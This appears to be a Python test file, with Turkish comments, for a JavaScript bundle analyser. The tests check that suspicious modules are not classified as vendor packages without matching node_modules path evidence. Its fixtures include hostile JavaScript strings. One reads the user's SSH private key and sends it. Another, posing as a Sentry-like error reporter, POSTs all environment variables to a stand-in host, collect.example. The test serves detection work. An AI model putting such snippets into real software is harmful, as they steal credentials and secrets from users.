"""P20 kalem 3 — BICIM-11: npm parmak izi zararlı modülü "vendor" diye saklamasın.

Önce (d2f205d): imza dizgileri düz alt dizgi olarak aranıyor, 2-3 eşleşme
"Vendored <paket>" + ``vendor/<paket>`` için yetiyordu. Bulgudaki üç örnek
(anahtar okuyan ``keyload``, ``stealer``, ``pubsub``) ve iki tuzak varyantı 5/5
``vendor/`` altına gidiyordu; vendor modülü yapısal katmana (Layer 2) hiç
girmiyordu.
Sonra: dizgiler belirteç sınırıyla aranıyor (``pkcs`` ≠ ``pkcs8``); "vendor"
hükmü yalnız paketin kendi yol kanıtıyla (modül başlığındaki
``Module: ./node_modules/<paket>/...``). Yalnız dizgi benzerliği olan modül
vendor sayılmıyor, ipucu (``npm_hints``) olarak saklanıyor ve Layer 2'ye kalıyor.
"""

from __future__ import annotations

import json
from pathlib import Path

from karadul.reconstruction.naming.npm_fingerprinter import (
    NpmFingerprinter,
    _token_pattern,
)
from karadul.reconstruction.naming.pipeline import NamingPipeline

_KEYLOAD = (
    'const home = process.env.HOME;\n'
    'const key = require("fs").readFileSync(home + "/.ssh/id_rsa", "utf8");\n'
    'if (key.includes("pem")) send(key); // pkcs8\n'
)
_STEALER = (
    "// Sentry-like error reporter\n"
    'const Sentry = { dsn: "https://collect.example/x" };\n'
    "Sentry.captureException = (e) => fetch(Sentry.dsn, "
    '{method: "POST", body: JSON.stringify(process.env)});\n'
)
_PUBSUB = (
    "const bus = new Subject();\n"
    "bus.pipe(filter(Boolean)).subscribe((m) => exfil(m));\n"
)
# Gerçek rxjs benzeri gövde (dizgiler belirteç olarak): yol kanıtıyla vendor olmalı.
_RXJS_LIKE = (
    "var Observable = function () {}; var Subscriber = {}; var Subject = {};\n"
    "var BehaviorSubject = {}; var Subscription = {};\n"
    "function switchMap() {} function mergeMap() {} function takeUntil() {}\n"
)


def _with_path(pkg: str, body: str) -> str:
    return f"/**\n * Module: ./node_modules/{pkg}/index.js\n * Type: webpack_object\n */\n{body}"


def test_token_boundary_rejects_substrings():
    assert _token_pattern("pkcs").search("pkcs8 key") is None
    assert _token_pattern("pem").search("var pemFile = 1") is None
    assert _token_pattern("fetch(").search("refetch(x)") is None
    assert _token_pattern("pem").search('key.includes("pem")') is not None
    assert _token_pattern(".command(").search("program.command(x)") is not None


def test_bulgu_examples_are_not_vendor():
    fp = NpmFingerprinter()
    for name, content in (("keyload", _KEYLOAD), ("stealer", _STEALER), ("pubsub", _PUBSUB)):
        assert fp._match_module(content, name) is None, name


def test_string_similarity_alone_is_hint_not_vendor():
    fp = NpmFingerprinter()
    hint = fp.similarity_hint(_STEALER, "stealer")
    assert hint is not None and hint["package"] == "@sentry/node"
    assert "doğrulanmadı" in hint["evidence"]
    # Belirteç sınırı: "pkcs8" içindeki "pkcs" artık sayılmıyor.
    assert fp.similarity_hint(_KEYLOAD, "keyload") is None


def test_decoy_strings_cannot_buy_vendor_without_path():
    fp = NpmFingerprinter()
    assert fp._match_module(_RXJS_LIKE, "m1") is None
    res = fp._match_module(_with_path("rxjs", _RXJS_LIKE), "m1")
    assert res is not None
    assert res.category == "vendor/rxjs"
    assert "bundle path ./node_modules/rxjs/index.js" in res.description
    assert "not hash-verified" in res.description


def test_path_must_name_the_matched_package():
    """Başka paketin yolu kanıt sayılmaz (yol 'lodash', dizgiler 'rxjs')."""
    fp = NpmFingerprinter()
    assert fp._match_module(_with_path("lodash", _RXJS_LIKE), "m1") is None


def test_path_alone_is_not_enough():
    fp = NpmFingerprinter()
    assert fp._match_module(_with_path("rxjs", "module.exports = 1;\n"), "m1") is None


def test_pipeline_keeps_suspicious_module_out_of_vendor(tmp_path: Path):
    mods = tmp_path / "webpack_modules" / "modules"
    mods.mkdir(parents=True)
    (mods / "m_stealer.js").write_text(_STEALER, encoding="utf-8")
    (mods / "m_pubsub.js").write_text(_PUBSUB, encoding="utf-8")
    (mods / "m_rx.js").write_text(_with_path("rxjs", _RXJS_LIKE), encoding="utf-8")

    pipe = NamingPipeline()
    manifest = pipe.run(mods)
    out = tmp_path / "named_project"
    pipe.apply(mods, out, manifest)

    for mid in ("m_stealer", "m_pubsub"):
        res = manifest.results.get(mid)
        assert res is None or not res.category.startswith("vendor"), (mid, res)
        assert mid in manifest.npm_hints
    assert manifest.results["m_rx"].category == "vendor/rxjs"
    assert manifest.statistics["npm_similarity_hints"]["counted_as_vendor"] == 0

    vendor_files = list((out / "vendor").rglob("*.js")) if (out / "vendor").exists() else []
    assert [p.parent.name for p in vendor_files] == ["rxjs"]

    saved = tmp_path / "manifest.json"
    manifest.save(saved)
    data = json.loads(saved.read_text(encoding="utf-8"))
    assert set(data["npm_hints"]) >= {"m_stealer", "m_pubsub"}
